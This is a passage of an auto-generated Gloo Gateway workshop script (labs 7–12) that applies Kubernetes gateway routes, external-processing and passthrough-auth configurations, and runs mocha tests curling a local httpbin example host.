timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  rules:
    - matches:
      - path:
          type: Exact
          value: /200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  parentRefs:
    - name: httpbin
      namespace: gloo-system
      group: gateway.networking.k8s.io
      kind: HTTPRoute
  rules:
    - matches:
      - path:
          type: Exact
          value: /200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin-status
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /status
      backendRefs:
        - name: httpbin2
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'201\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/201', retCode: 201 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-201.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl delete --context ${CLUSTER1} -n httpbin httproute httpbin-status

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
      - group: delegation.gateway.solo.io
        kind: label
        name: team1
        namespace: httpbin
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    delegation.gateway.solo.io/label: team1
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation-with-labels/../delegation/tests/https.test.js.liquid from lab number 8"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
      - group: delegation.gateway.solo.io
        kind: label
        name: team1
        namespace: all
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation-with-labels/../delegation/tests/https.test.js.liquid from lab number 8"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl --context $CLUSTER1 patch settings default -n gloo-system --type merge -p "
spec:
  extProc:
    allowModeOverride: false
    failureModeAllow: false
    filterStage:
      predicate: After
      stage: AuthZStage
    grpcService:
      extProcServerRef:
        name: ext-proc-grpc
        namespace: gloo-system
    processingMode:
      requestHeaderMode: SEND
      responseHeaderMode: SKIP
"
kubectl --context $CLUSTER1 apply -n gloo-system -f- <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ext-proc-grpc
spec:
  selector:
    matchLabels:
      app: ext-proc-grpc
  replicas: 1
  template:
    metadata:
      labels:
        app: ext-proc-grpc
    spec:
      containers:
        - name: ext-proc-grpc
          image: gcr.io/product-excellence-424719/ext-proc-example-basic-sink:0.0.3
          imagePullPolicy: IfNotPresent
          ports:
            - containerPort: 18080
---
apiVersion: v1
kind: Service
metadata:
  name: ext-proc-grpc
  labels:
    app: ext-proc-grpc
  annotations:
    gloo.solo.io/h2_service: "true"
spec:
  ports:
  - port: 4444
    targetPort: 18080
    protocol: TCP
  selector:
    app: ext-proc-grpc
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("extProc application", () => {
  it('is running', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "gloo-system", k8sObj: "ext-proc-grpc" }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-extproc.test.js.liquid from lab number 9"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
kubectl --context $CLUSTER1 apply -n gloo-system -f- <<EOF
apiVersion: gloo.solo.io/v1
kind: Upstream
metadata:
  labels:
    app: ext-proc-grpc
    discovered_by: kubernetesplugin
  name: ext-proc-grpc
  namespace: gloo-system
spec:
  discoveryMetadata: {}
  useHttp2: true
  kube:
    selector:
      app: ext-proc-grpc
    serviceName: ext-proc-grpc
    serviceNamespace: gloo-system
    servicePort: 4444
EOF
echo "Waiting for 10 seconds..."
sleep 10
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
const { debugLog } = require("../../default/tests/utils/logging");
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("extProc is processing headers properly", function() {
  const command = `curl -s -H "Header1: value1" -H 'Instructions: {"addHeaders": {"Header2": "value2"} }' -k "https://httpbin.example.com/get"`;
  debugLog(`Curl Command is: ${command}`);
  const cli = chaiExec(command);
  try {
    JSON.parse(cli.stdout);
  } catch(error) {
    debugLog(`Stdout from Curl:\n${cli.stdout}`);
    debugLog(`Stderr from Curl:\n${cli.stderr}`);
  }
  const headersToCheck = [{key: "Header1", value: "value1"}, {key: "Header2", value: "value2"}];
  const curlOutput = JSON.parse(cli.stdout);
  debugLog(`Response:\n${cli.stdout}`);
  headersToCheck.forEach(header => {
    const match = header.match ?? true;
    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
    if (header.value === '*' ) {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
        });
      } else {
        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.be.undefined;
        });
      };
    } else {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.contain(header.value);
        });
      } else {
        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
        });
      };
    };
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
const { debugLog } = require("../../default/tests/utils/logging");
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("extProc is processing headers properly", function() {
  const command = `curl -s -H "Header1: value1" -H 'Instructions: {"addHeaders": {"Header2": "value2"},"removeHeaders":["Instructions"]}' -k "https://httpbin.example.com/get"`;
  debugLog(`Curl Command is: ${command}`);
  const cli = chaiExec(command);
  try {
    JSON.parse(cli.stdout);
  } catch(error) {
    debugLog(`Stdout from Curl:\n${cli.stdout}`);
    debugLog(`Stderr from Curl:\n${cli.stderr}`);
  }
  const headersToCheck = [{key: "Header1", value: "value1"}, {key: "Header2", value: "value2"}, {key: "Instructions", value: "*", match: false}];
  const curlOutput = JSON.parse(cli.stdout);
  debugLog(`Response:\n${cli.stdout}`);
  headersToCheck.forEach(header => {
    const match = header.match ?? true;
    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
    if (header.value === '*' ) {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
        });
      } else {
        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.be.undefined;
        });
      };
    } else {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.contain(header.value);
        });
      } else {
        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
        });
      };
    };
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
kubectl --context $CLUSTER1 apply -f- <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: ext-proc-grpc
  namespace: httpbin
spec:
  options:
    extProc:
      overrides:
        processingMode:
          requestHeaderMode: SKIP
EOF
kubectl apply --context $CLUSTER1 -f- <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: ext-proc-grpc
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
echo "Waiting for 10 seconds..."
sleep 10
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
const { debugLog } = require("../../default/tests/utils/logging");
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("extProc is processing headers properly", function() {
  const command = `curl -s -H 'Instructions: {"addHeaders": {"Header3": "value3"},"removeHeaders":["Instructions"]}' -k "https://httpbin.example.com/get"`;
  debugLog(`Curl Command is: ${command}`);
  const cli = chaiExec(command);
  try {
    JSON.parse(cli.stdout);
  } catch(error) {
    debugLog(`Stdout from Curl:\n${cli.stdout}`);
    debugLog(`Stderr from Curl:\n${cli.stderr}`);
  }
  const headersToCheck = [{key: "Header3", value: "*", match: false}, {key: "Instructions", value: "*", match: true}];
  const curlOutput = JSON.parse(cli.stdout);
  debugLog(`Response:\n${cli.stdout}`);
  headersToCheck.forEach(header => {
    const match = header.match ?? true;
    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
    if (header.value === '*' ) {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
        });
      } else {
        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.be.undefined;
        });
      };
    } else {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.contain(header.value);
        });
      } else {
        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
        });
      };
    };
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
kubectl --context $CLUSTER1 apply -f- <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: ext-proc-grpc
  namespace: httpbin
spec:
  options:
    extProc:
      overrides:
        processingMode:
          requestHeaderMode: SEND
EOF
echo "Waiting for 10 seconds..."
sleep 10
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
const { debugLog } = require("../../default/tests/utils/logging");
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("extProc is processing headers properly", function() {
  const command = `curl -s -H 'Instructions: {"addHeaders": {"Header3": "value3"},"removeHeaders":["Instructions"]}' -k "https://httpbin.example.com/get"`;
  debugLog(`Curl Command is: ${command}`);
  const cli = chaiExec(command);
  try {
    JSON.parse(cli.stdout);
  } catch(error) {
    debugLog(`Stdout from Curl:\n${cli.stdout}`);
    debugLog(`Stderr from Curl:\n${cli.stderr}`);
  }
  const headersToCheck = [{key: "Header3", value: "value3", match: true}, {key: "Instructions", value: "*", match: false}];
  const curlOutput = JSON.parse(cli.stdout);
  debugLog(`Response:\n${cli.stdout}`);
  headersToCheck.forEach(header => {
    const match = header.match ?? true;
    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
    if (header.value === '*' ) {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
        });
      } else {
        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
          expect(curlOutput["headers"][header.key]).to.be.undefined;
        });
      };
    } else {
      if (match) {
        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.contain(header.value);
        });
      } else {
        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
        });
      };
    };
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
kubectl --context $CLUSTER1 -n httpbin delete httproute httpbin
kubectl --context $CLUSTER1 -n httpbin delete routeoption ext-proc-grpc
kubectl --context $CLUSTER1 -n gloo-system delete upstream ext-proc-grpc
kubectl --context $CLUSTER1 -n gloo-system delete service -l app=ext-proc-grpc
kubectl --context $CLUSTER1 -n gloo-system delete deploy ext-proc-grpc
kubectl --context $CLUSTER1 -n gloo-system patch settings default --type=json -p="[{'op': 'remove', 'path':'/spec/extProc'}]"
kubectl --context cluster1 apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: httpbin-extauth-httpservice
  namespace: httpbin
spec:
  selector:
    matchLabels:
      app: http-extauth
  replicas: 1
  template:
    metadata:
      labels:
        app: http-extauth
    spec:
      containers:
        - name: http-extauth
          image: gcr.io/product-excellence-424719/passthrough-http-service-example:latest
          imagePullPolicy: IfNotPresent
          ports:
            - containerPort: 9001
          env:
            - name: REQUEST_LOGGING
              value: "true"
---
apiVersion: v1
kind: Service
metadata:
  name: example-http-auth-service
  namespace: httpbin
  labels:
    app: http-extauth
spec:
  ports:
  - port: 9001
    protocol: TCP
  selector:
    app: http-extauth
EOF
kubectl -n httpbin wait --for=condition=ready pod -l app=http-extauth
kubectl --context cluster1 apply -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: httpbin1-http-passthrough-auth
  namespace: httpbin
spec:
  configs:
    - passThroughAuth:
        http:
          url: http://example-http-auth-service.httpbin.svc.cluster.local:9001/auth
          connectionTimeout: 3s
          request:
            allowedHeaders:
            - authorization
EOF
kubectl apply -f- <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: httpbin1-http-passthrough-auth
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: httpbin1-http-passthrough-auth
        namespace: httpbin
EOF
kubectl apply --context cluster1 -f- <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: httpbin1-http-passthrough-auth
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
INGRESS_GW_ADDRESS=$(kubectl --context cluster1 -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
./scripts/register-domain.sh "httpbin.example.com" ${INGRESS_GW_ADDRESS}
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Communication status", () => {
  it("Accessing http-passthrough-auth without authorization header should return a 401", () => {
    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}'"});
    expect(command).to.contain("401");
  });
  
  it("Accessing http-passthrough-auth with a BAD authorization header should return a 401", () => {
    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: deny me'"});
    expect(command).to.contain("401");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-http-passthrough-auth/tests/http-passthrough-not-authorized.liquid from lab number 10"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Communication status", () => {
  it("Accessing http-passthrough-auth with authorization header should return a 200", () => {
    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: authorize me'"});
    expect(command).to.contain("200");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-http-passthrough-auth/tests/http-passthrough-authorized.liquid from lab number 10"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
kubectl --context cluster1 -n httpbin delete httproute httpbin
kubectl --context cluster1 -n httpbin delete routeoption httpbin1-http-passthrough-auth
kubectl --context cluster1 -n httpbin delete authconfig httpbin1-http-passthrough-auth
kubectl --context cluster1 -n httpbin delete service -l app=http-extauth
kubectl --context cluster1 -n httpbin delete deploy httpbin-extauth-httpservice
kubectl --context cluster1 apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: httpbin-extauth-grpcservice
  namespace: httpbin
spec:
  selector:
    matchLabels:
      app: grpc-extauth
  replicas: 1
  template:
    metadata:
      labels:
        app: grpc-extauth
    spec:
      containers:
        - name: grpc-extauth
          image: gcr.io/product-excellence-424719/passthrough-grpc-service-example:latest
          imagePullPolicy: IfNotPresent
          ports:
            - containerPort: 9001
          env:
            - name: REQUEST_LOGGING
              value: "true"
---
apiVersion: v1
kind: Service
metadata:
  name: example-grpc-auth-service
  namespace: httpbin
  labels:
    app: grpc-extauth
spec:
  ports:
  - port: 9001
    protocol: TCP
  selector:
    app: grpc-extauth
EOF
kubectl -n httpbin wait --for=condition=ready pod -l app=grpc-extauth
kubectl --context cluster1 apply -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: httpbin1-grpc-passthrough-auth
  namespace: httpbin
spec:
  configs:
    - passThroughAuth:
        grpc:
          address: example-grpc-auth-service.httpbin.svc.cluster.local:9001
          connectionTimeout: 3s
          retryPolicy:
            numRetries: 10
            retryBackOff:
              baseInterval: 1s
              maxInterval: 2s
EOF
kubectl apply -f- <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: httpbin1-grpc-passthrough-auth
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: httpbin1-grpc-passthrough-auth
        namespace: httpbin
EOF
kubectl apply --context cluster1 -f- <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: httpbin1-grpc-passthrough-auth
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
INGRESS_GW_ADDRESS=$(kubectl --context cluster1 -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
./scripts/register-domain.sh "httpbin.example.com" ${INGRESS_GW_ADDRESS}
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Communication status", () => {
  it("Accessing grpc-passthrough-auth without authorization header should return a 403", () => {
    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}'"});
    expect(command).to.contain("403");
  });
  it("Accessing grpc-passthrough-auth with a BAD authorization header should return a 403", () => {
    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: deny me'"});
    expect(command).to.contain("403");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-grpc-passthrough-auth/tests/grpc-passthrough-not-authorized.liquid from lab number 11"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Communication status", () => {
  it("Accessing grpc-passthrough-auth with authorization header should return a 200", () => {
    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: authorize me'"});
    expect(command).to.contain("200");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-grpc-passthrough-auth/tests/grpc-passthrough-authorized.liquid from lab number 11"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
kubectl --context cluster1 -n httpbin delete httproute httpbin
kubectl --context cluster1 -n httpbin delete routeoption httpbin1-grpc-passthrough-auth
kubectl --context cluster1 -n httpbin delete authconfig httpbin1-grpc-passthrough-auth
kubectl --context cluster1 -n httpbin delete service -l app=grpc-extauth
kubectl --context cluster1 -n httpbin delete deploy httpbin-extauth-grpcservice
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.gloo.solo.io/v1alpha1
kind: DirectResponse
metadata:
  name: health
  namespace: httpbin
spec:
  status: 200
  body: "The service is available"
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /health
      filters:
      - type: ExtensionRef
        extensionRef:
          name: health
          group: gateway.gloo.solo.io
          kind: DirectResponse
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Direct response returns 200", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/health', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/direct-response/tests/direct-response.test.js.liquid from lab number 12"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: RequestHeaderModifier
          requestHeaderModifier:
            add:
              - name: Foo
                value: bar
            set:
              - name: User-Agent
                value: custom
            remove:
              - To-Remove
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request transformations applied", () => {
